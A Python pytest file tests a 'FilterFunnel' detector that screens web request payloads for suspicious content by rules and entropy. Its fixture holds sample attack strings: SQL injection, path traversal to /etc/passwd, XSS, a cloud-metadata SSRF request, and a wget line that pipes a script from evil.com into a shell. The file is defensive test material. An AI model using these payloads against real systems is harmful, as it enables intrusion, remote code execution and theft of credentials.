import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import pandas as pd
import pytest
from core.filter_funnel import FilterFunnel


class TestFilterFunnel:
    """FilterFunnel 过滤器测试"""

    @pytest.fixture
    def sample_data(self):
        """测试数据"""
        return pd.DataFrame([
            {'payload_summary': "SELECT * FROM users WHERE id=1"},
            {'payload_summary': "GET /index.php?page=../../etc/passwd"},
            {'payload_summary': "正常请求 /api/data?id=123"},
            {'payload_summary': "<script>alert('XSS')</script>"},
            {'payload_summary': "curl http://169.254.169.254/latest/meta-data/"},
            {'payload_summary': "wget http://evil.com/malware.sh | sh"},
            {'payload_summary': "admin' OR '1'='1"},
            {'payload_summary': "正常业务请求"},
        ])

    def test_init(self):
        """测试初始化"""
        funnel = FilterFunnel()
        assert funnel is not None
        assert funnel.rules is not None

    def test_suspicious_by_rules(self, sample_data):
        """测试规则筛选"""
        funnel = FilterFunnel()
        result = funnel.suspicious_by_rules(sample_data)
        assert len(result) > 0
        assert len(result) < len(sample_data)

    def test_suspicious_by_entropy(self, sample_data):
        """测试熵值筛选"""
        funnel = FilterFunnel()
        result = funnel.suspicious_by_entropy(sample_data)
        assert result is not None

    def test_filter(self, sample_data):
        """测试综合过滤"""
        funnel = FilterFunnel()
        result = funnel.filter(sample_data)
        assert result is not None
        assert isinstance(result, pd.DataFrame)

    def test_filter_with_empty_df(self):
        """测试空DataFrame"""
        funnel = FilterFunnel()
        result = funnel.filter(pd.DataFrame())
        assert result.empty

    def test_filter_with_none(self):
        """测试None输入"""
        funnel = FilterFunnel()
        result = funnel.filter(None)
        assert result is None


if __name__ == '__main__':
    pytest.main([__file__, '-v'])
